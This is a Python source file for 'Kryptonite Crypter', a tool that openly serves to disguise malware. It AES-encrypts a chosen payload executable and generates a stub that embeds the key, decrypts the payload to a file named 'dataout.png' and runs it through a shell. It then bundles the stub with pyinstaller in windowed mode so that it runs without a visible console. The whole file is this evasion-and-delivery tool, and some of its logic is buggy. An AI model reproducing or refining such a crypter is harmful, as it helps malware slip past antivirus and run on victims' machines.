import random
from random import *
import string
import struct
import time
import os
from os.path import isfile, join
from os.path import join as pjoin
from os import listdir
import pyAesCrypt
import binascii
import secrets

# Window init
windowTitle = "Kryptonite Crypter"
os.system("title " +windowTitle)
os.system("mode con: cols=100 lines=30")

# ANSI Colors
class colors:
    RED   = "\033[1;31m"
    BLUE  = "\033[1;34m"
    CYAN  = "\033[1;36m"
    GREEN = "\033[0;32m"
    END = "\033[0;0m"
    BOLD    = "\033[;1m"

# Keep logo func
def keepLogo():
    print("")
    print("\t\t\t  _   __                 _              _ _        ")
    print("\t\t\t | | / /                | |            (_) |       ")
    print("\t\t\t | |/ / _ __ _   _ _ __ | |_ ___  _ __  _| |_ ___  ")
    print("\t\t\t |    \| '__| | | | '_ \| __/ _ \| '_ \| | __/ _ \ ")
    print("\t\t\t | |\  \ |  | |_| | |_) | || (_) | | | | | ||  __/ ")
    print("\t\t\t \_| \_/_|   \__, | .__/ \__\___/|_| |_|_|\__\___| ")
    print("\t\t\t              __/ | |                              ")
    print("\t\t\t             |___/|_|                              ")
    print("")
    print("\t\t\tType 'help' at any time to find a list of commands")
    print("")

keepLogo()

def clearScreen():
    os.system('cls')

# Create 256 bit AES encryption key
def encrypting():
        global password
        password = secrets.randbits(256)
        global key
        key = str(password)
        print(colors.GREEN + "\t\t\t\t    Creating encryption key" + colors.END)
        print(r"")
        print("\t  " + str(password))
        time.sleep(2.5)
        return

def selectFile():
    # User selects non-crypted malware path
    clearScreen()
    keepLogo()
    print(r"                        Select an input file by specifying the full file path")
    print(r"                        Example: C:\Users\John\Desktop\payload.exe")
    print(r"")
    selectPrompt = input("\t\t\tSelect file > ")
    filePath = os.path.isfile(selectPrompt)
    print(r"")
    if filePath == True:
        clearScreen()
        keepLogo()
        def outputDirectory():
            # User chooses a directory to save the output file
            print(r"                        Choose a directory to save the file to")
            print(r"                        Example: C:\Users\John\Desktop")
            print(r"")
            outputPrompt = input("\t\t\tSave to > ")
            outputPath = os.path.exists(outputPrompt)
            print(r"")
            if outputPath == True:
                clearScreen()
                keepLogo()
                if password == password:
                    def cryptFile():
                        clearScreen()
                        keepLogo()
                        # Get filename from path
                        fileNameWithExtension = os.path.basename(selectPrompt)
                        fileName, fileExtension = os.path.splitext(fileNameWithExtension)
                        path, fileName = os.path.split(selectPrompt)
                        stubPrompt = input("\t\t\tCrypt file (Y/N) > ")
                        bufferSize = 64 * 1024
                        if stubPrompt == "Y" or "Yes":
                            # Crypt file data (Using AES)
                            clearScreen()
                            keepLogo()
                            pyAesCrypt.encryptFile(selectPrompt, outputPrompt + "\\" + fileName + ".aes", str(key), bufferSize)
                            print(colors.GREEN + "\t\t\t\tEncrypting file using 256-bit AES" + colors.END)
                            # Encode encrypted file contents
                            encryptedPath = outputPrompt + "\\" + fileName + ".aes"
                            encryptedFile = open(encryptedPath, 'rb')
                            temp = encryptedFile.read()
                            encryptedHex = binascii.hexlify(temp)
                            time.sleep(1.5)
                            clearScreen()
                            keepLogo()
                            # Create Stub in Python File
                            print(colors.GREEN + "\t\t\t\t        Creating stub file" + colors.END)
                            print(r"")
                            finalPath = outputPrompt + "\\" + fileName + ".py"
                            finalFilename = outputPrompt + "\\" + fileName
                            stubPy = open(finalPath,'w')
                            stubContents = "import pyAesCrypt\n"
                            stubContents += "import binascii\n"
                            stubContents += "key = \"" + key + "\"\n"
                            stubContents += "bufferSize = \"" + str(bufferSize) + "\"\n"
                            stubContents += "encryptedHex = \"" + str(encryptedHex) + "\"\n"
                            stubContents += """
# Decode the hexed encrypted file
temp = binascii.unhexlify(bytes(encryptedHex))

# Decrypt the decoded data
pyAesCrypt.decryptFile(temp, "dataout.png", key, int(bufferSize))

# Execute payload
import subprocess
proc = subprocess.Popen("dataout.png", shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                            """
                            stubPy.write(stubContents)
                            stubPy.close()
                            time.sleep(1.5)
                            clearScreen()
                            keepLogo()
                            # Combine stub with payload
                            print(colors.GREEN + "\t\t\t\t    Combining stub with payload" + colors.END)
                            os.system("pyinstaller -F -w --log-level INFO --distpath " + outputPrompt + " --clean " + finalPath)
                            print(r"")
                            time.sleep(1.5)
                            enterToBegin = input(colors.BLUE + "\t\t\t\t     Press ENTER to exit " + colors.END)
                        else:
                            print("Error!")
                            encrypting()
                    cryptFile()
            else:
                clearScreen()
                keepLogo()
                print(colors.RED + "\t\t\t\t    That is not a valid directory!" + colors.END)
                print(r"")
                outputDirectory()
        outputDirectory()
    else:
        clearScreen()
        keepLogo()
        print(colors.RED + "\t\t\t\t     That file does not exist!" + colors.END)
        print(r"")
        selectFile()
enterToBegin = input(colors.CYAN + "\t\t\t\t     Press ENTER to continue " + colors.END)
clearScreen()
keepLogo()
encrypting()
selectFile()
